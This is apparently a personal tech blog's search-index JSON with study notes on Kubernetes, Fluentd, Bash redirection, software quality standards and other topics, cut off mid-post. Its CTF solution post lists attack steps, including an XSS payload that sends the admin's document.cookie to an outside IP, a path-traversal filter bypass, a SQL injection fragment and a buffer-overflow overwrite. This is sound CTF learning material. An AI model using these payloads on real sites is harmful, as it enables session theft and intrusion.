{"meta":{"title":"Gwang Story","subtitle":"History","description":null,"author":"GwangHui Park","url":"https://blog.devkwang.app","root":"/"},"pages":[{"title":"all-archives","date":"2019-10-28T07:07:34.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"all-archives/index.html","permalink":"https://blog.devkwang.app/all-archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-03-01T15:32:04.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"categories/index.html","permalink":"https://blog.devkwang.app/categories/index.html","excerpt":"","text":""},{"title":"hello","date":"2019-10-28T06:53:51.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"hello/index.html","permalink":"https://blog.devkwang.app/hello/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-03-01T15:30:47.000Z","updated":"2022-01-28T01:25:12.483Z","comments":true,"path":"tags/index.html","permalink":"https://blog.devkwang.app/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"cka-section2-core-concept","slug":"cka-section2-core-concept","date":"2022-02-08T00:48:15.000Z","updated":"2022-02-13T11:48:39.721Z","comments":true,"path":"2022/02/08/cka-section2-core-concept/","link":"","permalink":"https://blog.devkwang.app/2022/02/08/cka-section2-core-concept/","excerpt":"","text":"Cluster Architecture Node Master Nodes: Manage, Plan, Schedule, Monitor Nodes ETCD Cluster: Etcd is a database that stores information in a key-value format kube-scheduler: identifies that right node to place a container based on the containers Resource requirements the worker nodes capacity any other policies or constraints such as taint(얼룩) and toleration(관용) or node affinity rules that are on them Controller Manager Node-Controller: takes care of nodes they’re responsible for onboarding new nodes to the cluster handling situations where nodes become unavailable or gets destroyed Replication-Controller: ensures that the desired number of containers are running at all times in your replication Kube-api server primary management component of kubernetes kube-api server is responsible for orchestrating all operations within the cluster it exposes the kubernetes API which is used by external user to perform management operations on the cluster as well as the various controllers to monitor the state of the cluster make the necessary changes as required and by the worker nodes to communicate with the server. DNS Server Worker Nodes: Host Application as Containers Container Runtime Engine: Docker, kubelet kubelet is responsible for managing all activities on these nodes. a kubelet is an agent that runs on each node in a cluster. it listens for instructions from the kube-api and deploys or destroys containers on the nodes as required. kube-proxy Communication between worker nodes are enabled by another component that runs on the worker node known as the kube-proxy service. kube-proxy service ensures that the necessary rules are in place on the worker nodes to allow the containers running on them to reach each other 쿠버네티스(k8s)설치 및 환경 구성하기 ETCD Cluster ETCD datastore stores information regarding the cluster nodes pods config secrets accounts roles bindings others two type of kubernetes deployment scratch set up a cluster we set ot up from scratch other using kubeadm tool. The practice test environments are deployed using the kubeadm tool setup kubectl get pods -n kube-system kubectl exec etcd-master -n kube-system etcdctl get get / --prefix -keys-only Kube-API server primary management component in kubernetes view api-server options - kubeadm cat /etc/kubernetes/manifests/kube-apiserver.yaml view api-server options cat /etc/systemd/system/kube-apiserver.service ps -aux | grep kube-apiserver kube controller manager node controller Watch status Remediate Situation Node Monitor period = 5s Node Monitor Grace Period = 40s POD Eviction Timeout = 5m installing kube-controller-manager view kube-controller-manager - kubeadm kubectl get pods -n kube-system view kube-controller-manager options - install kubeadm cat /etc/kubernetes/manifests/kube-controller-manager.yaml view kube-controller-manager options - non kubeadm setup cat /etc/systemd/system/kube-controller-manager.service kube-Scheduler scheduling pods on nodes. only responsible for deciding which pod goes on which node. It doesn’t actually place the pod on the nodes. That’s the job of the kubelet. The kubelet is who creates the pod on the nodes. The scheduler only decides which pod goes where. how to work scheduler in high level architecture node status filter nodes rank nodes install view kube-controller-manager options- install kubeadm cat /etc/kubernetes/manifests/kube-scheduler.yaml view kube-scheduler options ps -aux | grep kube-scheduler POD with YAML pod-definition.yml 1234567apiVersion: v1kind: Podmetadata: name: myapp-pod labels: app: myappspec:","categories":[],"tags":[]},{"title":"fluentd","slug":"fluentd","date":"2022-01-28T06:13:29.000Z","updated":"2022-01-28T07:29:00.125Z","comments":true,"path":"2022/01/28/fluentd/","link":"","permalink":"https://blog.devkwang.app/2022/01/28/fluentd/","excerpt":"","text":"Fluentd Event Structure A Fluentd event consists of three components tag: Specifies the origin where an event comes from. It is used for message routing. time: Specifies the time when an event happens with nanosecond resolution. record: Specifies the actual log as a JSON Object Processing Event Input -&gt; filter -&gt; Output Buffer non-buffered output Mode: default buffered mode를 사용할 경우 plug-in 필요 flush condition을 만날때 버퍼를 출력하기 때문에 stdout 처럼 즉시 log를 볼수는 없음. configuration docker For a Docker container, the default location of the config file is /fluentd/etc/fluent.conf. To mount a config file from outside of Docker, use a bind-mount. 1docker run -ti --rm -v /path/to/dir:/fluentd/etc fluentd -c /fluentd/etc/&lt;conf-file&gt; Directives source directives determine the input sources match directives determine the output destinations filter directives determine the event processing pipelines system directives set system-wide configuration `- label directives group the output and filter for internal routing @include directives include other files Source: where all the data come from standard input plugins : http, forward(tcp) source directive must include @type parameter 123456789101112# Receive events from 24224/tcp# This is used by log forwarding and the fluent-cat command&lt;source&gt; @type forward port 24224&lt;/source&gt;# http://&lt;ip&gt;:9880/myapp.access?json=&#123;\"event\":\"data\"&#125;&lt;source&gt; @type http port 9880&lt;/source&gt; 1234# generated by http://&lt;ip&gt;:9880/myapp.access?json=&#123;\"event\":\"data\"&#125;tag: myapp.accesstime: (current time)record: &#123;\"event\":\"data\"&#125; event consists of three entities tag, time, record tag: string separated by dots (e.g. myapp.access), and is used as the directions for Fluentd internal routing engine it is strongly recommended that you stick to the lower-case alphabets, digits and underscore time: specified by input plugins, and it must be in the Unix time format. record: JSON Object Input plugin match: Tell fluentd what to do! The match directive looks for events with matching tags and processes them the plugins that correspond to the match directive are called output plugins 123456789101112131415161718192021# Receive events from 24224/tcp# This is used by log forwarding and the fluent-cat command&lt;source&gt; @type forward port 24224&lt;/source&gt;# http://&lt;ip&gt;:9880/myapp.access?json=&#123;\"event\":\"data\"&#125;&lt;source&gt; @type http port 9880&lt;/source&gt;# Match events tagged with \"myapp.access\" and# store them to /var/log/fluent/access.%Y-%m-%d# Of course, you can control how you partition your data# with the time_slice_format option.&lt;match myapp.access&gt; @type file path /var/log/fluent/access&lt;/match&gt; Each match directive must include a match pattern and a @type parameter Only events with a tag matching the pattern will be sent to the output destination in the above example, only the events with the tag myapp.access are matched filter: Event processing pipeline The filter directive has the same syntax as match but filter could be chained for processing pipeline. Using filters, event flow is like this: Input -&gt; filter 1 -&gt; … -&gt; filter N -&gt; Output 1234567891011121314151617# http://this.host:9880/myapp.access?json=&#123;\"event\":\"data\"&#125;&lt;source&gt; @type http port 9880&lt;/source&gt;&lt;filter myapp.access&gt; @type record_transformer &lt;record&gt; host_param \"#&#123;Socket.gethostname&#125;\" &lt;/record&gt;&lt;/filter&gt;&lt;match myapp.access&gt; @type file path /var/log/fluent/access&lt;/match&gt; The received event {“event”:“data”} goes to record_transformer filter first. The record_transformer filter adds host_param field to the event; and, then the filtered event {“event”:“data”,“host_param”:“webserver1”} goes to the file output plugin. System: Set system-wide configuration log_level suppress_repeated_stacktrace emit_error_log_interval suppress_config_dump without_source process_name (Only available in system directive. No fluentd option) 1234567&lt;system&gt; # equal to -qq option log_level error # equal to --without-source option without_source # ...&lt;/system&gt; label: Group filter and output The label directive groups filter and output for internal routing The label reduces the complexity of tag handling. 123456789101112131415161718192021222324252627282930&lt;source&gt; @type forward&lt;/source&gt;&lt;source&gt; @type tail @label @SYSTEM&lt;/source&gt;&lt;filter access.**&gt; @type record_transformer &lt;record&gt; # ... &lt;/record&gt;&lt;/filter&gt;&lt;match **&gt; @type elasticsearch # ...&lt;/match&gt;&lt;label @SYSTEM&gt; &lt;filter var.log.middleware.**&gt; @type grep # ... &lt;/filter&gt; &lt;match **&gt; @type s3 # ... &lt;/match&gt;&lt;/label&gt; The @ERROR label is a builtin label used for error record emitted by plugin’s emit_error_event API. If &lt;label @ERROR&gt; is set, the events are routed to this label when the related errors are emitted e.g. the buffer is full or the record is invalid. The @ROOT label is a builtin label used for getting root router by plugin’s event_emitter_router API. This label is introduced since v1.14.0 to assign a label back to the default route. For example, timed-out event records are handled by the concat filter can be sent to the default route. include: Reuse your config The directives in separate configuration files can be imported using the @include directive: The @include directive can be used under sections to share the same parameters: 12345678910# Include config files in the ./config.d directory@include config.d/*.conf# This is bad@include *.conf# This is good@include a.conf@include config.d/*.conf@include z.conf How do the match patterns work? Wildcards, Expansions and other tips matches a single tag part. For example, the pattern a.* matches a.b, but does not match a or a.b.c ** matches zero or more tag parts. For example, the pattern a.** matches a, a.b and a.b.c {X,Y,Z} matches X, Y, or Z, where X, Y, and Z are match patterns. For example, the pattern {a,b} matches a and b, but does not match c This can be used in combination with * or ** patterns. Examples include a.{b,c}.* and a.{b,c.**}. /regular expression/ is for complex patterns For example, the pattern /(?!a.).*/ matches non-a. started tags like b.xxx This feature is supported since fluentd v1.11.2 When multiple patterns are listed inside a single tag (delimited by one or more whitespaces), it matches any of the listed patterns. For example The patterns match a and b. The patterns &lt;match a.** b.*&gt; match a, a.b, a.b.c (from the first pattern) and b.d (from the second pattern) Match Order Fluentd tries to match tags in the order that they appear in the config file. Supported Data Types for Values string: the field is parsed as a string. This is the most generic type, where each plugin decides how to process the string. The string has three literals: non-quoted one line string, ’ single-quoted string and &quot; double-quoted string. literal examples integer: the field is parsed as an integer. float: the field is parsed as a float. size: the field is parsed as the number of bytes. There are several notational variations k or K: number of kilobytes m or M: number of megabytes g or G: number of gigabytes t or T: number of terabytes Otherwise, the field is parsed as an integer, and that integer is the number of bytes. time: the field is parsed as a time duration. s: seconds m: minutes h: hours d: days Otherwise, the field is parsed as float, and that float is the number of seconds. This option is useful for specifying sub-second time durations such as 0.1 (0.1 second = 100 milliseconds). array:the field is parsed as a JSON array. It also supports the shorthand syntax. These are the same values normal: [“key1”, “key2”] shorthand: key1,key2 hash: the field is parsed as a JSON object. It also supports the shorthand syntax. These are the same values: normal: {“key1”: “value1”, “key2”: “value2”} shorthand: key1:value1,key2:value2 Common Plugin Parameters The type, id and log_level parameters are supported for backward compatibility. @type: specifies the plugin type @id: specifies the plugin id. in_monitor_agent uses this value for plugin_id field @label: specifies the label symbol. See label section. @log_level: specifies per plugin log level. See Per Plugin Log section. Check Configuration File 1$ fluentd --dry-run -c fluent.conf Format Tips Multiline support for &quot; quoted string, array and hash values Example # 1: mail plugin 1234&lt;match **&gt; @type mail subject \"[CRITICAL] foo's alert system\"&lt;/match&gt; Example #2: map plugin 12345&lt;match tag&gt; @type map map '[[\"code.\" + tag, time, &#123; \"code\" =&gt; record[\"code\"].to_i&#125;], [\"time.\" + tag, time, &#123; \"time\" =&gt; record[\"time\"].to_i&#125;]]' multi true&lt;/match&gt;","categories":[],"tags":[]},{"title":"linux-IORedirection","slug":"linux-IORedirection","date":"2022-01-28T05:30:50.000Z","updated":"2022-01-28T05:38:48.082Z","comments":true,"path":"2022/01/28/linux-IORedirection/","link":"","permalink":"https://blog.devkwang.app/2022/01/28/linux-IORedirection/","excerpt":"","text":"IO Redirection three default file stdin: the keyboard stdout: the screen stderr: error messages output to the screen assigned a file descriptor stdin: 0 stdout: 1 stderr: 2 12345678910111&gt;filename # Redirect stdout to file \"filename.\"1&gt;&gt;filename # Redirect and append stdout to file \"filename.\"2&gt;filename # Redirect stderr to file \"filename.\"2&gt;&gt;filename # Redirect and append stderr to file \"filename.\"&amp;&gt;filename # Redirect both stdout and stderr to file \"filename.\" # This operator is now functional, as of Bash 4, final release. Closing File Descriptors Close input file descriptor n. : n&lt;&amp;- Close stdin. : 0&lt;&amp;-, &lt;&amp;- Close output file descriptor n : n&gt;&amp;- Close stdout :1&gt;&amp;-, &gt;&amp;- 1234567# Redirecting only stderr to a pipe.exec 3&gt;&amp;1 # Save current \"value\" of stdout.ls -l 2&gt;&amp;1 &gt;&amp;3 3&gt;&amp;- | grep bad 3&gt;&amp;- # Close fd 3 for 'grep' (but not 'ls').# ^^^^ ^^^^exec 3&gt;&amp;- # Now close it for the remainder of the script.","categories":[],"tags":[]},{"title":"ctf_solution2020","slug":"ctf_solution2020","date":"2022-01-28T01:25:12.423Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2022/01/28/ctf_solution2020/","link":"","permalink":"https://blog.devkwang.app/2022/01/28/ctf_solution2020/","excerpt":"","text":"reverse engineering forensic web network information hiding crypto 솔로몬의 저울 fastcoll : 해쉬 충돌을 통해 서로 다른 2개의 파일의 md5 해쉬값을 똑같이 만들 수 있다. 서로 다른 2개의 파일에서 같은 해쉬 값을 얻을수 있다. 라이언 일병 구하기 2 information hiding Hex to JPG base64 Decode MZ는 실행파일 기드라로 virustotal.com : base64 decoding 화면 조정시간 file view lite stegsolve 8초쯤 비둘기 게임 시즌 2-1 소켓통신 40자리, 알파벳 대문자, 숫자 python -_-;; 걍 던져라 Capture the Flag!!! Hex Editor Fake Lock 암호화된 파일은 Hex 21 1993-constant.tistory.com 게시글 댓글 찾기 -1 querystring masterseq, boardSeq = 5에서 찾음 masterseq = 7 에서 찾을수 있었음 라이언 일병 구하기 Crypto Enigma 해독 Enigma 해독 알고리즘 Tardis forensics AccessData FTK Imager Hex Editor Base64 encoding, Decoding Tardis Connector_1, magic number 4D 5A hex editor로 2개 파일 연결 Ghidra exe파일 디컴파일 16진수로 저장된 비밀번호를 ASCII로 변환한걸 확인 리틀 인디안 나르코스 information hiding ZIP Magic Number 50 5b 03 04 복사 찍은 날짜 스트링이 QR Code https://hahamas10.github.io/binary-to-qrcode Barcapture 집무실 청소 -1 파일 카빙, hex editor 파일명이 user7.jpg suspiciousfile.txt 49 46 매직 넘버 ZIP으로 변경 퍼즐 게임 level 1 AES 128, ECB Decryption 분기처리를 보면 힌트 암호화된 텍스트와 암호화 방식을 확인할 수 있다. puzzle1 , key Wallpaper Downloader File Traversal preg_match bypass parameter filter response header php transaction.php 파일 다운로드 파라미터 필터 로직, i플래그가 없으면 대소문자 구분한다 wallPaper.jpg 같이 p 한 단어만 대문자로 만들어도 …/…/…/…/…/SDS/goooooooodluck_DevHack/flag 패스워드 찾기 로그인 찾기 모든 게시물 조회 후 소스 보기를 통해 로그인 접속 정보 확인 소스보기로 주석이 써있었다 암호화된 패스워드 리스트 Content 길이가 MD5 MD5 rainbow table MD5 decrypt SQL Injection 시도 로그인 # and 1=1 and md5decrypt.net 관리자의 쿠키를 훔쳐라 서버로 가기전 lt, gt 형태로 치환되는것을 확인 자바스크립트로 치환하는 것을 확인 burp suite 쿠키를 획득할 수 있는 스크립트를 URI_Encoding document.location='http://182.195.92.204:8080/~+document.cookie 관리자의 쿠키를 또!! 훔쳐라 Request에서는 입력한 값 그대로인 것을 확인 &lt;&gt;~~ The Water world PDF파일 포멧을 보면 &lt;Type/ExtGState&gt; 0.1096 -&gt; 0.0196 Key is ‘a_whole_new_world’ Catch me if you can DNS_covert_channel FTP message.xlsx UDP, 작은 거 Have I been pwned? Reverse Engineering buffer overflow Buf[4] AAAA ESP BBBB EBP CCCC + GccDummy[4] RET Attack ADdr /x06/x15/x40 Secret Agent 2021년","categories":[],"tags":[]},{"title":"architect-course-software-quality-attribute","slug":"architect-course-software-quality-attribute","date":"2021-08-16T07:52:06.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/08/16/architect-course-software-quality-attribute/","link":"","permalink":"https://blog.devkwang.app/2021/08/16/architect-course-software-quality-attribute/","excerpt":"","text":"국체 표준 약자 ISO : International Organization for Standardization, 국제표준화기구 IEC : International Electrotechnical Commission, 국제전기기술위원회 IEEE : Institute of Electrical and Electronics Engineers, 국제전기기술자협회 ISO/IEC 9126, ISO/IEC 25010 소프트웨어 제품의 품질특성을 정의하고 품질을 평가하기 위한 기준(Metrics)을 정의한 표준 소프트웨어 제품을 사용하는 사용자의 입장에서 어떤 특징을 가진 소프트웨어가 품질이 높은 소프트웨어라 할 수 있는가? 에 대한 관점으로 접근 ISO/IEC 9126 : Software Engineering - Product Quality 기능성, 신뢰성, 사용성, 효율성, 유지보수성, 이식성 ISO/IEC 25010 : Systems and software engineering - Systems and software quality requirements and evaluation 기능적합성, 신뢰성, 사용성, 실행효율성, 유지보수성, 이식성, 호환성, 보안성 제품 품질 특성 기능 적합성 (Functional suitability) : 제품(시스템)이 명시된 조건에서 사용될경우, 명시되거나 암시된 요구를 충족시키는 기능을 제공하는 정도 기능 성숙도 (Functional Completeness) : 해당 기능들이 사용자의 모든목적을 만족하는 정도 기능 정확도 (Functional Correctness) : 제품(시스템)이 정밀도의 필요 정도에따라 정확한 결과를 제공하는 정도 기능 타당성 (Functional Appropriateness) : 기능이 명시된 작업 및 목적의 완수를 용이하게 하는 정도 수행 효율성 (Performance efficiency) : 주어진 조건에서 자원의 양에 따른 성능 시간반응성(Time Behavior) : 기능을 수행할 때 제품(시스템)의 응답 및 처리시간과 처리율이 요구사항을 충족시키는 정도 자원 활용(Resource Utilization) : 기능을 수행할 때 제품(시스템)에서 사용하는 자원의 유형이나 양이 요구사항을 만족시키는 정도 기억용량 : (Capacity) 제품(시스템파라미터)의 최대 한계가 요구사항을 만족시키는 정도 호환성 (Compatibility) : 다른 제품과 함께 동일한 SW(HW) 환경을 공유하면서 필요한 기능을 수행할 수 있는 정도 상호 공존성(Co-existence) : 제품(시스템)이 다른 제품(시스템)에 유해를 가하지 않고 일반적인 환경 및 자원을 공유하면서 제품에 요구된 기능을 효과적으로 수행할 수 있는 정도 상호 운용성(Interoperability) : 둘 이상의 제품(시스템, 구성요소)이 서로 정보를 교환하거나 교환한 정보를 사용할 수 있는 정도 사용성 (Usability) : 명시된 사용 환경에서 제품(시스템)이 사용자에 의해 유효성, 효율성 및 만족의 목적을 달성하는 정도 타당성 식별력(Appropriateness Recognizability) : 제품(시스템)의 기능이 사용자의 요구에 적절한지 여부를 식별할 수 있는 정도 학습성(Learnability) : 사용자가 제품(시스템)의 목적에 맞게 사용 방법을 학습하여 사용할 수 있는 정도 운용성(Operability) : 제품(시스템)을 제어하거나 동작하는 것을 쉽게 할 수 있는 정도 사용자 오류보호(User error Protection) : 발생한 오류로부터 시스템이 사용자를 보호하는 정도 사용자 인터페이스 미학(User Interface Aesthetics) : 사용자 인터페이스가 사용자와의 상호작용에서 유쾌하고 만족스러울수 있는 정도 접근성(Accessibility) : 지정한 상황에서 제품(시스템)이 다양한 특성을 가진(연령/장애) 사람에의해 명시된 목표를 달성하며 사용할 수 있는 정도 신뢰성 (Reliability) : 제품(시스템, 구성요소)이 명시된 기간과 조건하에서 명시된 기능을 유지하는 정도 성숙도 (Maturity) : 제품(시스템, 구성요소)이 표준 환경에서 고장을 회피하며 신뢰도를 충족시키는 정도 가용성 (Availability) : 제품(시스템, 구성요소)을 사용할 필요가 있을 때 사용하거나 접근할 수 있는 정도 오류 허용성 (Fault Tolerance) : 제품(시스템, 구성요소)에 SW(HW) 결함이 존재해도 의도한 성능 수준을 유지할 수 있는 정도 회복 가능성 (Recoverbility) : 고장이 발생하였을 때 제품(시스템)이 직접 원하는 성능 수준으로 회복하며 데이터를 복구할 수 있는 정도 보안(Security) : 제품(시스템)이 정보(데이터를) 보호하는 정도 기밀성 (Confidentiality) : 제품(시스템)이 접근 허가된 권한만 있는 다른 제품(시스템)만 접근할 수 있게 하는 정도 무결성 (Integrity) : 제품(시스템, 구성요소)이 컴퓨터 프로그램 혹은 데이터를 무단으로 접근(변경)하는것을 방지하는 정도 부인방지 (Non-repudiation) : 사건(행동)이 발생한 뒤 그 사실을 거부할 수 없도록 사건(행동)에 대해 입증하는 정도 책임성 (Accountability) : 사용자의 행동을 고유하게 식별하여 그 사용자의 행동을 추정할 수 있는 정도 인증성 (Authenticity) : 사건 및 행동에 대해 주체임을 증명할 수 있는 능력 유지보수성(Maintainability) : 제품(시스템)을 효과적이고 효율적으로 의도된대로 변경할 수 있는 정도 모듈성 (Modularity) : 외부에 대하여 최소의 영향을 가진 개별 구성 요소로 시스템(SW)이 구성된 정도 재사용성 (Reusability) : 자산(모듈)이 한 개 이상의 시스템에서 사용될 수 있거나, 다른 자산에 구축할 수 있는 정도 분석성 (Analyzability) : 제품(시스템)의 문제를 식별하고, 고장의 원인을 진단하고 변경사항을 반영하기 위하여 수정하여야 하는 부분을 식별하기 쉬운 정도 수정 가능성 (Modifiability) : 제품(시스템)을 수정할때, 기존 제품의 품질을 저하시키거나 장애를 발생시키지 않으면서 효과적이고 효율적으로 수정할 수 있는 정도 시험 가능성 (Testability) : 제품(시스템, 구성요소)을 검증한 근거가 충분한지를 확인할 수 있는 정도 이식성 (Portability) : 제품(시스템, 구성요소)이 다른 다양한 환경(SW/HW/Network) 등으로의 전환이 용이한 정도 적합성 (Adaptability) : 제품(시스템)을 다른 SW(HW)나 사용환경에 효과적이고 효율적으로 적용할 수 있는 정도 설치 가능성 (Installability) : 제품(시스템)이 성공적으로 설치/제거될 수 있는 정도 대치성 (Replaceability) : 제품이 동일한 환경에서 동일한 목적을 위해 다른 지정된 SW 제품으로 대체될 수 있는 정도 characteristic definition 기능적합성 제품 혹은 시스템이 명시된 조건에서 사용될 경우 명시되거나 암시된 요구를 충족시키는 기능을 제공하는 정도 수행 효율성 규정된 조건 하에 사용된 자원의 크기에 대한 상대적 성능 호환성 같은 하드웨어 혹은 SW 환경을 공유하는 동안 기타 제품,시스템 혹은 구성요소를 교환할 수 있고/혹은 요구된 기능을 구성할 수 있는 정도 유용성 제품 및 시스템이 명시된 사용 환경에서 유효성, 효율성 및 만족의 명시된 목적을 달성하는 명시된 사용자에 인해 사용될 수 있는 정도 신뢰성 시스템, 제품 혹은 구성요소가 시간이 명시된 기간에 대해 명시된 조건 하에서 명시된 기능을 구성하는 정도 보안 제품 혹은 시스템은 정보 및 데이터를 보호한다. 그래서 사람 혹은 기타 제품 혹은 시스템이 자신의 유형 및 인증 정도에 적절한 데이터 접근의 정도를 가지고 있다 유지관리성 제품 혹은 시스템의 유효성이 유지관리자로 인해 변경될 수 있는 정도 이동성 시스템, 제품 혹은 구성요소는 하드웨어, SW 혹은 기타 운영 혹은 다른 하나의 사용 환경으로 전환될 수 있는 유효성 및 효율성의 정도","categories":[],"tags":[{"name":"architect course","slug":"architect-course","permalink":"https://blog.devkwang.app/tags/architect-course/"}]},{"title":"startup-stock-type","slug":"startup-stock-type","date":"2021-08-08T22:59:30.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2021/08/09/startup-stock-type/","link":"","permalink":"https://blog.devkwang.app/2021/08/09/startup-stock-type/","excerpt":"","text":"PS (Preference Shares 우선주) 보통주보다 재산적 내용(이익, 이자배당, 잔여 재산 분배 등)에 있어서 우선적인 지위가 인정 보통주의 기본적 특성인 의결권을 포기 경영 참가 의사가 없고 배당 등 자산 소득에 관심이 높은 개인 투자자들 대상으로 발행 CPS (Convertible Preferred Stock 전환 우선주) 우선주의 형태로 발행 후 일정기간이 지난 후 보통주로 전환할 수 있는 권리 전체 우선주의 25% 범위 내에서 발행 가능 특정 세력의 적대적 M&amp;A 시도가 있을 경우 기존 우호주주에게 우선 배정해 경영안정을 도모하기도 함 RPS (Redeemable preferred Stock 상환 우선주) 특정 기간 동안 우선주의 성격을 가지고 있다가 기간이 만료되면 발행회사에서 다시 주식을 되사가는 주식 상환을 전제로 발행하기 때문에 만기 존재, 발행회사는 만기에 되사서 반드시 소각해야 함 상환의 결정은 회사 측에서 일방적으로 이루어질 수도 있고, 주주의 청구에 의하여 이루어질 수도 있다. RCPS (Redeemable Convertible preferred Stock 상환 전환 우선주) 만기 때 투자금을 상환 받을 수 있는 상환권, 우선주를 보통주로 전활할 수 있는 전환권, 잔여재산이나 매각대금에 분배해 우선하는 권리를 가지는 우선권을 모두 가지고 있는 주식이다. IFRS 상으로 부채로 분류되지만 회사가 상환권을 가지면 자본으로 인정받을 수 있으며, RCPS를 CPS로 전환해 자본 안정성을 높일 수 있다.","categories":[],"tags":[{"name":"stock","slug":"stock","permalink":"https://blog.devkwang.app/tags/stock/"}]},{"title":"window-font","slug":"window-font","date":"2021-08-07T06:35:39.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2021/08/07/window-font/","link":"","permalink":"https://blog.devkwang.app/2021/08/07/window-font/","excerpt":"","text":"Window 폰트 바꾸기 네이버에서 폰트 다운로드 네이버폰트 설정 가 레지스트리 편집기 실행 (Win + R키 (실행) ☞ regedit) ‘HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts’ 경로로 들어가서 Batang &amp; BatangChe &amp; Gungsuh &amp; GungsuhChe (TrueType) 더블 클릭후, batang.ttc 값 지우고 공란으로 놔둔다. Gulim &amp; GulimChe &amp; Dotum &amp; DotumChe (TrueType) 더블 클릭후, gulim.ttc 값 지우고 공란으로 놔둔다. 나 레지스트리 편집기 실행 (Win + R키 (실행) ☞ regedit) ‘HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes’ 경로로 들어가셔서 마우스 우클릭 ☞ 새로 만들기 ☞ 문자열 값 입력 후 ☞ 더블클릭으로 실행 값 이름에 Gulim, 값데이터에 “나눔바른고딕” 넣어 만들어줍니다. “Gulim” = “나눔바른고딕” “Dotum”=“나눔바른고딕” “Batang”=“나눔명조” “Gungsuh”=“나눔명조”","categories":[],"tags":[{"name":"font","slug":"font","permalink":"https://blog.devkwang.app/tags/font/"}]},{"title":"reactive-spring-01","slug":"reactive-spring-01","date":"2021-07-21T05:17:19.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/07/21/reactive-spring-01/","link":"","permalink":"https://blog.devkwang.app/2021/07/21/reactive-spring-01/","excerpt":"","text":"Webflux It is fully non-blocking, supports Reactive Streams back pressure, and runs on such servers as Netty, Undertow, and Servlet 3.1+ containers. Reactive Stream 스트림 프로세싱을 비동기로 처리할 수 있는 표준안 제공 Rxjava 비동기 및 이벤트 기반 프로그램을 구성하기 위한 Reactive Extension의 구현체 데이터/이벤트의 시퀀스를 지원 하도록 관찰자 패턴 을 확장하고 low-level threading, 동기화, thread-safety 및 동시성을 가지는 데이터 구조와 같은 문제를 추상화하면서 선언적으로 시퀀스를 함께 구성할 수 있는 연산자를 추가 Reactive Stream Dependency https://github.com/ReactiveX/RxJava/wiki Coroutine vs Rxjava https://thdev.tech/kotlin/2018/11/07/RxJava-To-Kotlin-Coroutine/","categories":[],"tags":[]},{"title":"event-driven-microservice-buliding","slug":"event-driven-microservice-buliding","date":"2021-05-28T07:01:51.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2021/05/28/event-driven-microservice-buliding/","link":"","permalink":"https://blog.devkwang.app/2021/05/28/event-driven-microservice-buliding/","excerpt":"","text":"데이터 해방 쿼리 기반 벌크 로딩 벌크 쿼리를 실행해서 전체 데이터를 로드합니다. 앞으로 계속할 증분 업데이트를 하기 직전, 그리고 각 폴링 주기마다 전체 테이블을 로드할 경우에 수행하는 작업 대량 데이터의 경우 비용이 많이 들고 구현체마다 성능 편차가 심하므로 조심 증분 타임스탬프 로딩 이전 쿼리 결과의 최정 타임 스탬프 이후에 쌓인 데이터를 쿼리해 적재 최근 업데이트 시간 컬럼/필드를 기준으로 레코드가 가장 마지막에 수정된 시간을 찾아 매번 증분 업데이트할 때마다 최종 수정시간 컬럼/필드가 이 시간 이후인 레코드만 가져옴 자동증가 ID 로딩 증분 업데이트를 할 때마다 ID 값이 마지막으로 처리한 ID 보다 큰 데이터만 쿼리해서 적재 맞춤 쿼리 클라이언트 쿼리 언어로 제한 대용량 데이터 중 일부만 필요하거나 내부 데이터 모델이 과도하게 노출되는 것을 막기 위해 여러 테이블의 데이터를 조인하고 반정규화 할때 이런 맞춤 쿼리를 사용함 증분 업데이트 데이터 세트의 레코드에 필요한 타임스탬프나 자동 증가 ID를 생성하고 쿼리가 아직 처리하지 않은 레코드에서 이미 처리한 레코드를 필터링하려면 필요 최근 업데이트 시간 컬럼이나 자동증가 ID가 없다면 데이터 저장소가 알아서 추가해서 채우도록 설정 경합 조건(race condition)이 생기지 않도록 폴링 빈도와 업데이트 지연 시간을 정하고 마지막으로 벌크로드 1회 후 업데이트 장점 맞춤성(customizability) : 모든 데이터 저장소를 쿼리할 수 있고 클라이언트가 마음껏 쿼리 옵션을 지정 가능 독립적인 폴링 주기 : SLA가 엄격한 쿼리는 실행 빈도를 높이고 그밖에 비용이 많이는 나머지 쿼리는 빈도를 낮춤 내부 데이터 모델의 격리 : 관계형 DB에서는 구체화 뷰(materialized view) 또는 뷰(view) 객체를 이용해 내부 데이터 모델과 분리할 수 있음 단점 최종 업데이트 시간 타임스탬프가 필수 : 데이터가 마지막으로 업데이트된 시간에 따라 증분 업데이트를 하는 방식이라 필수 하드 삭제(hard deletion) 추적 불가 : 삭제를 추적하려면 플래그 기반의 소프트 삭제만 가능 데이터 스키마, 출력 이벤트 스키마 간 취약한 의존 관계 : 다운 스트림 이벤트 포멧의 스키마 규칙과 호환되지 않는 방향으로 데이터 세트 스키마가 변경될 가능성이 항상 존재 간헐적 캡처(intermittent capture) : 데이터가 일정한 폴링 주기마다 동기화되기 때문에 동일한 레코드에 대한 일련의 변경들은 각자 개별적인 이벤트로만 보임 생산 리소스 낭비 : 쿼리를 실행하려면 하부 시스템의 리소스를 사용해야 하므로 생산 시스템의 지연 시간이 너무 커질 수 있음 데이터 변경 때문에 쿼리 성능이 오르락내리락함 : 데이터 변경 규모에 따라 변환 데이터량이 변해 최악의 경우, 전체 데이터가 계속 변경되어 현재 쿼리가 전부 처리 되기 전에 다음 쿼리가 요청되는 경합조건이 발생할 수 있음 로그 기반 WAL(write ahead log) 사용 시간 경과에 따라 데이터 세트에 발생한 모든 일을 붙임 전용 로그 형태로 남기는 것 최초 기존 데이터의 스냅샷을 찍고 이후 changelog에서 이벤트를 캡처하여 전송 장점 삭제 추적 : 바이너리 로그에는 하드 레코드 삭제가 이미 포함되어 있기 